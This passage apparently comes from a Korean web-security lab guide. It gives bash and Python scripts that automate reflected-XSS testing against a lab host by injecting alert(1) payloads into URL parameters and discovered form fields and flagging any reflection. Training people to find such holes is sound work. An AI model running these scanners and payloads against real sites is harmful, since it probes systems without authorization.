    ■ 실습 방법

    ▶ 1단계: bash 자동화 (단순)
    ```bash
    #!/bin/bash
    TARGET=${1:-http://10.20.30.80}
    INPUTS=(
      "/#/search?q="
      "/api/Feedbacks?comment="
      "/profile?name="
      "/login?user="
    )
    PAYLOADS=(
      "<script>alert(1)</script>"
      "<img src=x onerror=alert(1)>"
      "<svg onload=alert(1)>"
      "javascript:alert(1)"
    )
    for INPUT in "${INPUTS[@]}"; do
      for PAYLOAD in "${PAYLOADS[@]}"; do
        ENC=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
        RESP=$(curl -s "$TARGET$INPUT$ENC")
        if echo "$RESP" | grep -qF "$PAYLOAD"; then
          echo "[VULN] $INPUT → $PAYLOAD"
        fi
      done
    done
    echo "XSS 자동화 스크립트 설계 완료"
    ```

    ▶ 2단계: Python requests + BeautifulSoup (form 자동 발견)
    ```python
    #!/usr/bin/env python3
    import requests, sys
    from bs4 import BeautifulSoup
    from urllib.parse import urljoin

    TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://10.20.30.80"
    PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>", "javascript:alert(1)"]

    # 1. 모든 form 발견
    r = requests.get(TARGET)
    soup = BeautifulSoup(r.text, 'html.parser')
    forms = soup.find_all('form')

    for form in forms:
        action = urljoin(TARGET, form.get('action', ''))
        method = form.get('method', 'get').lower()
        inputs = {i.get('name'): 'test' for i in form.find_all('input') if i.get('name')}

        for payload in PAYLOADS:
            for key in inputs:
                data = {**inputs, key: payload}
                resp = requests.request(method, action, data=data) if method=='post' else requests.get(action, params=data)
                if payload in resp.text:
                    print(f"[VULN] {action} field={key} → {payload}")
    ```

